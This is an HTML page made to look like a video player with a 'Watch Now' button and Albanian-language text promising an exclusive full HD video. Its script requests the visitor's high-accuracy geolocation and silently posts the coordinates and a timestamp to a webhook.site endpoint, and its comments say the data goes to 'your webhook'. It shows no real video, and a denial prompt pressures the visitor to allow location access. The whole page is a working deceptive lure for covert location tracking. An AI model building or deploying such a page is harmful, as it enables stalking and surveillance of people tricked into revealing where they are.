<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Video Online</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .video-container {
            width: 90%;
            max-width: 600px;
            background: #212121;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        .thumbnail {
            position: relative;
            width: 100%;
            height: 320px;
            background: linear-gradient(45deg, #2c2c2c, #1a1a1a);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .play-btn {
            background-color: #ff0000;
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(255,0,0,0.4);
            transition: transform 0.2s;
        }
        .play-btn:hover {
            transform: scale(1.05);
        }
        .video-info {
            padding: 16px;
            text-align: left;
        }
        .video-title {
            font-size: 16px;
            font-weight: 600;
            margin: 0 0 8px 0;
        }
        .video-channel {
            font-size: 14px;
            color: #aaa;
            margin: 0;
        }
    </style>
</head>
<body>

    <div class="video-container">
        <div class="thumbnail">
            <!-- Butoni që imiton shikimin e videos dhe aktivizon kërkesën e lokacionit -->
            <button class="play-btn" onclick="requestLocationAndPlay()">▶ Watch Now</button>
        </div>
        <div class="video-info">
            <h2 class="video-title">Ekskluzive: Videoja e plotë në HD</h2>
            <p class="video-channel">Kliko për të shfaqur videon</p>
        </div>
    </div>

    <script>
        function requestLocationAndPlay() {
            // Kontrollon nëse shfletuesi e mbështet gjeolokacionin
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;

                        // Dërgon koordinatat te Webhook-u juaj
                        fetch('https://webhook.site/eea6cf9f-37c7-47e9-95a9-4deaaf8e5663', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                latitude: lat,
                                longitude: lon,
                                timestamp: new Date().toISOString()
                            })
                        }).catch(err => console.log(err));

                        // Pasi jepet leja, mund të simulojë hapjen e videos ose mesazhin
                        alert('Duke u ngarkuar... Ju lutem prisni.');
                    },
                    function(error) {
                        alert('Duhet të lejoni lokacionin (Allow) për të shfaqur videon!');
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                alert('Pajisja juaj nuk e mbështet këtë shërbim.');
            }
        }
    </script>

</body>
</html>
